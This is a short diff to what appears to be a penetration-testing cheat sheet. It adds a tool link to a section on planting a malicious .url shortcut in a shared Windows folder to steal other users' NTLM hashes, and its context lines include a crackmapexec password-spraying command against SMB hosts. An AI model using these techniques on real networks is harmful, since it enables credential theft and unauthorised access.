@@ -24,7 +24,7 @@ crackmapexec smb <target_ips> -u <user_list> -p <pass_list> -d <domain> --contin
 ### Exploitation
 #### Malicious Shortcut
 ```
-If you have the ability to write to a windows share that is being used by other people. 
+If you have the ability to write to a windows share that is being used by other people. (https://github.com/Greenwolf/ntlm_theft)
 
 1. Create file @malicious_shortcut.url
 [InternetShortcut]
